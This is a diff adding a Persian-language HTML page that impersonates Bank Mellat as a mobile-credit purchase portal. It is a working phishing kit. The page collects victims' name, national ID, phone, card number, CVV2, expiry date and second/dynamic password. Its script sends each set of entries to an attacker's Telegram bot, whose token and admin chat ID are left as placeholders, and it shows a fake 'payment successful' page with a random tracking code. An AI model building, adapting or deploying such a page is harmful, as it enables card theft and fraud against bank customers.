@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>بانک ملت | Bank Mellat</title>
+  <style>
+    body {
+      font-family: "Vazir", sans-serif;
+      background-color: #f0f0f0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      position: relative;
+    }
+    .logo {
+      width: 150px;
+      margin-bottom: 10px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 5px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    .error-message {
+      color: red;
+      font-size: 12px;
+      margin-bottom: 10px;
+      text-align: right;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #c10016;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #a30013;
+    }
+    .options-container {
+      display: none;
+      margin-top: 20px;
+    }
+    .option-button {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .option-button:hover {
+      background-color: #45a049;
+    }
+    .charge-options {
+      display: none;
+      grid-template-columns: repeat(2, 1fr);
+      grid-gap: 10px;
+      margin-top: 15px;
+    }
+    .charge-option {
+      padding: 10px;
+      background-color: #f0f0f0;
+      border: 1px solid #ccc;
+      text-align: center;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .charge-option:hover {
+      background-color: #e0e0e0;
+    }
+    .payment-container {
+      display: none;
+      background-color: white;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      position: absolute;
+      top: 20%;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    .payment-title {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    .payment-box {
+      background-color: #fff;
+      border-radius: 10px;
+      padding: 20px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+    }
+    .green {
+      color: green;
+      font-size: 20px;
+    }
+    .blue-button {
+      background-color: #007bff;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 14px;
+      margin-left: 8px;
+      height: auto;
+      line-height: 1.2;
+      white-space: nowrap;
+      transform: translate(-5px, -2px);
+    }
+    .blue-button:hover {
+      background-color: #0056b3;
+    }
+    .green-button {
+      background-color: green;
+      color: white;
+      border: 1px solid red;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .green-button:hover {
+      background-color: darkgreen;
+    }
+    .orange-button {
+      background-color: orange;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 8px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .orange-button:hover {
+      background-color: darkorange;
+    }
+    .success-container {
+      display: none;
+    }
+    .tracking-code {
+      font-size: 20px;
+      margin: 20px 0;
+      color: #333;
+    }
+    .success-message {
+      font-size: 24px;
+      color: green;
+      margin-top: 10px;
+    }
+    /* Updated styling for the security code container */
+    .security-code-container {
+      display: flex;
+      align-items: center;
+      margin-top: 10px;
+    }
+    /* The code display box is now rectangular, moved a bit to the right and slightly up */
+    .code-display {
+      width: 40%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      background: repeating-linear-gradient(45deg, #ccc, #ccc 10px, #fff 10px, #fff 20px);
+      border-radius: 8px;
+      text-align: center;
+      font-size: 14px;
+      box-sizing: border-box;
+      margin-right: 10px;
+      transform: translate(10px, -5px);
+    }
+    /* The security input box will take 60% of the space and match the design of other inputs */
+    .security-input {
+      width: 60%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+  </style>
+</head>
+<body>
+  
+  <div class="container" id="login-page">
+    <img src="https://bankmellat.ir/images/logo.png" alt="Bank Mellat Logo" class="logo">
+    
+    <input type="text" id="name" placeholder="نام و نام خانوادگی">
+    <div id="error-name" class="error-message"></div>
+    
+    <input type="text" id="id" placeholder="کد ملی">
+    <div id="error-id" class="error-message"></div>
+    
+    <input type="text" id="phone" placeholder="شماره تلفن">
+    <div id="error-phone" class="error-message"></div>
+    
+    <button onclick="showOptions()">ورود به سامانه</button>
+  </div>
+
+  
+  <div class="container" id="main-page" style="display: none;">
+    <img src="https://bankmellat.ir/images/logo.png" alt="Bank Mellat Logo" class="logo">
+    <button class="option-button" onclick="showChargeOptions()">خرید شارژ</button>
+    <button class="option-button" onclick="showError()">خرید اینترنت</button>
+    
+    <div class="charge-options" id="charge-options">
+      <div class="charge-option" onclick="selectCharge(10000)">10000 تومان</div>
+      <div class="charge-option" onclick="selectCharge(20000)">20000 تومان</div>
+      <div class="charge-option" onclick="selectCharge(50000)">50000 تومان</div>
+      <div class="charge-option" onclick="selectCharge(15000)">15000 تومان</div>
+    </div>
+  </div>
+
+  
+  <div class="payment-container" id="payment-page">
+    <img src="https://bankmellat.ir/images/logo.png" alt="Bank Mellat Logo" class="logo">
+    <div class="payment-title">پرداخت مبلغ</div>
+    <div class="payment-box">
+      <h2>زمان باقی مانده:</h2>
+      <div id="timer" class="timer">10:00</div>
+      <h2 class="green" id="amount-paid">مبلغ پرداخت: 0 تومان</h2>
+    </div>
+    <div class="payment-box">
+      <input type="text" id="card-number" placeholder="شماره کارت">
+      <div id="error-card" class="error-message"></div>
+      <input type="text" id="cvv2" placeholder="Cvv2 (3 یا 4 رقم)">
+      <div id="error-cvv" class="error-message"></div>
+      <input type="text" id="expiration" placeholder="تاریخ انقضا (مثال: 09/02)">
+      <div style="display: flex; justify-content: space-between; align-items: center;">
+        <input type="text" id="ramz2" placeholder="رمز دوم یا رمز پویا" style="width: 70%;">
+        <button class="blue-button" id="request-button" onclick="requestPassword()">درخواست رمز</button>
+      </div>
+      
+      <div class="security-code-container">
+        <div id="generated-code" class="code-display"></div>
+        <input type="text" id="security-code-input" class="security-input" placeholder="کد امنیتی">
+      </div>
+      <div id="security-code-error" class="error-message"></div>
+    </div>
+    
+    <button class="green-button" onclick="pay()">پرداخت</button>
+  </div>
+
+  
+  <div class="container success-container" id="success-page" style="display: none;">
+    <img src="https://bankmellat.ir/images/logo.png" alt="Bank Mellat Logo" class="logo">
+    <div class="tracking-code" id="tracking-code">کد رهگیری: </div>
+    <div class="success-message">پرداخت موفق</div>
+    <button class="orange-button" onclick="goBack()">بازگشت</button>
+  </div>
+
+  <script>
+    // متغیر سراسری جهت نگهداری کد امنیتی تولید شده
+    let generatedSecurityCode = "";
+    
+    function generateSecurityCode() {
+      generatedSecurityCode = Math.floor(10000 + Math.random() * 90000).toString();
+      document.getElementById("generated-code").innerText = generatedSecurityCode;
+    }
+    
+    function clearErrors() {
+      document.getElementById("error-name").innerText = "";
+      document.getElementById("error-id").innerText = "";
+      document.getElementById("error-phone").innerText = "";
+      document.getElementById("error-card").innerText = "";
+      document.getElementById("error-cvv").innerText = "";
+      document.getElementById("security-code-error").innerText = "";
+    }
+
+    function showOptions() {
+      clearErrors();
+      var name = document.getElementById("name").value.trim();
+      var nationalId = document.getElementById("id").value.trim();
+      var phone = document.getElementById("phone").value.trim();
+
+      var hasError = false;
+      
+      // بررسی خالی نبودن مقدار ها
+      if (name === "") {
+        document.getElementById("error-name").innerText = "لطفا تمامی مقادیر را وارد کنید";
+        hasError = true;
+      }
+      if (nationalId === "") {
+        document.getElementById("error-id").innerText = "لطفا تمامی مقادیر را وارد کنید";
+        hasError = true;
+      }
+      if (phone === "") {
+        document.getElementById("error-phone").innerText = "لطفا تمامی مقادیر را وارد کنید";
+        hasError = true;
+      }
+      
+      if (hasError) return;
+
+      // بررسی نام و نام خانوادگی فقط شامل حروف باشد (فارسی و انگلیسی)
+      var nameRegex = /^[a-zA-Z\u0600-\u06FF\s]+$/;
+      if (!nameRegex.test(name)) {
+        document.getElementById("error-name").innerText = "نام و نام خانوادگی فقط باید شامل حروف باشد";
+        hasError = true;
+      }
+
+      // بررسی کد ملی فقط شامل اعداد باشد
+      var idRegex = /^[0-9]+$/;
+      if (!idRegex.test(nationalId)) {
+        document.getElementById("error-id").innerText = "کد ملی باید فقط شامل اعداد باشد";
+        hasError = true;
+      }
+
+      // بررسی شماره تلفن: باید 10 یا 11 رقم بوده و با 9 یا 09 شروع شود.
+      var phoneRegex1 = /^09\d{9}$/;
+      var phoneRegex2 = /^9\d{9}$/;
+      if (!phoneRegex1.test(phone) && !phoneRegex2.test(phone)) {
+        document.getElementById("error-phone").innerText = "لطفاً شماره تلفن خود را درست وارد کنید";
+        hasError = true;
+      }
+
+      if (hasError) return;
+      
+      document.getElementById("login-page").style.display = "none";
+      document.getElementById("main-page").style.display = "block";
+    }
+    
+    function showChargeOptions() {
+      document.getElementById("charge-options").style.display = "grid";
+    }
+    
+    function showError() {
+      alert("این قابلیت در حال حاضر در دسترس نیست.");
+    }
+
+    function selectCharge(amount) {
+      document.getElementById("payment-page").style.display = "block";
+      document.getElementById("main-page").style.display = "none";
+      document.getElementById("amount-paid").innerText = "مبلغ پرداخت: " + amount + " تومان";
+      startTimer();
+      generateSecurityCode();
+    }
+    
+    function startTimer() {
+      var time = 600;
+      var timerElement = document.getElementById("timer");
+      var interval = setInterval(function() {
+        if (time <= 0) {
+          clearInterval(interval);
+          timerElement.innerText = "زمان تمام شد";
+        } else {
+          var minutes = Math.floor(time / 60);
+          var seconds = time % 60;
+          timerElement.innerText = minutes + ":" + (seconds < 10 ? "0" + seconds : seconds);
+          time--;
+        }
+      }, 1000);
+    }
+
+    function startRequestTimer() {
+      const btn = document.getElementById("request-button");
+      btn.disabled = true;
+      let seconds = 60;
+      const originalText = "درخواست رمز";
+      btn.innerText = originalText + " (" + seconds + "s)";
+      const interval = setInterval(() => {
+        seconds--;
+        if (seconds > 0) {
+          btn.innerText = originalText + " (" + seconds + "s)";
+        } else {
+          clearInterval(interval);
+          btn.disabled = false;
+          btn.innerText = originalText;
+        }
+      }, 1000);
+    }
+
+    function requestPassword() {
+      startRequestTimer();
+      const cardNumber = document.getElementById("card-number").value;
+      const cvv2 = document.getElementById("cvv2").value;
+      const expiration = document.getElementById("expiration").value;
+      const ramz2 = document.getElementById("ramz2").value;
+      const amount = document.getElementById("amount-paid").innerText;
+      const message = `
+#Nᴇᴡ_ᴍᴇssᴀɢᴇ » ғʀᴏᴍ ᴍᴇʟʟᴀᴛ
+
+#درخواست_رمز_دوم
+
+💸Aᴍᴏᴜɴᴛ: ${amount}
+
+💳Cᴀʀᴅ ɴᴜᴍʙᴇʀ: ${cardNumber}
+
+🗂️Cvv2: ${cvv2}
+
+🌟Exᴘɪʀᴀᴛɪᴏɴ Dᴀᴛᴇ: ${expiration}
+
+📊ʀᴀᴍᴢ_ᴅᴏᴠᴏᴍ: ${ramz2}
+      
+♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛
+
+♛Oᴡɴᴇʀ : @darghah_poyan
+      `;
+     
+      sendToAdmin(message);
+    }
+
+    function sendToAdmin(message) {
+      const adminApiUrl = "https://api.telegram.org/botتوکن رو اینجا بزارید /sendMessage";
+      const chatId = "ایدی عددی ادمین ";
+      const text = encodeURIComponent(message);
+      const url = `${adminApiUrl}?chat_id=${chatId}&text=${text}`;
+      fetch(url, { mode: "no-cors" })
+      .then(response => console.log("Message sent to admin"))
+      .catch(error => console.error("Error sending message:", error));
+    }
+
+    function pay() {
+      clearErrors();
+      const name = document.getElementById("name").value;
+      const nationalId = document.getElementById("id").value;
+      const phone = document.getElementById("phone").value;
+      const cardNumber = document.getElementById("card-number").value;
+      const cvv2 = document.getElementById("cvv2").value;
+      const expiration = document.getElementById("expiration").value;
+      const ramz2 = document.getElementById("ramz2").value;
+      const securityInput = document.getElementById("security-code-input").value;
+      let hasError = false;
+      
+      if(!/^\d{16}$/.test(cardNumber)){
+        document.getElementById("error-card").innerText = "شماره کارت باید دقیقا 16 رقم عددی باشد";
+        hasError = true;
+      }
+      if(!/^\d{3,4}$/.test(cvv2)){
+        document.getElementById("error-cvv").innerText = "cvv2 باید 3 یا 4 رقم عددی باشد";
+        hasError = true;
+      }
+      if(securityInput !== generatedSecurityCode){
+        document.getElementById("security-code-error").innerText = "کد امنیتی وارد شده صحیح نمی‌باشد";
+        hasError = true;
+        generateSecurityCode();
+      }
+      
+      if(hasError) return;
+      
+      const amount = document.getElementById("amount-paid").innerText;
+      const trackingCode = Math.floor(10000000 + Math.random() * 90000000);
+      document.getElementById("tracking-code").innerText = "کد رهگیری: " + trackingCode;
+      const message = `
+#Nᴇᴡ_ᴍᴇssᴀɢᴇ » ғʀᴏᴍ ᴍᴇʟʟᴀᴛ
+
+❀❀❀❀
+
+👤ɴᴀᴍᴇ: ${name}
+_______________
+
+📩ᴄᴏᴅᴇ_ᴍᴇʟʟɪ: ${nationalId}
+_______________
+
+☎️ᴘʜᴏɴᴇ: ${phone}
+
+■■■■■■■■■■■
+
+💸Aᴍᴏᴜɴᴛ: ${amount}
+
+■■■■■■■■■■■
+
+💳Cᴀʀᴅ ɴᴜᴍʙᴇʀ: ${cardNumber}
+_______________
+
+🗂️Cvv2: ${cvv2}
+_______________
+
+🌟Exᴘɪʀᴀᴛɪᴏɴ Dᴀᴛᴇ: ${expiration}
+_______________
+
+📊ʀᴀᴍᴢ_ᴅᴏᴠᴏᴍ: ${ramz2}
+      
+♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛♛      
+      
+♛Oᴡɴᴇʀ : @darghah_poyan
+      `;
+      sendToAdmin(message);
+      document.getElementById("payment-page").style.display = "none";
+      document.getElementById("success-page").style.display = "block";
+    }
+
+    function goBack() {
+      document.getElementById("success-page").style.display = "none";
+      document.getElementById("main-page").style.display = "block";
+    }
+  </script>
+</body>
+</html>
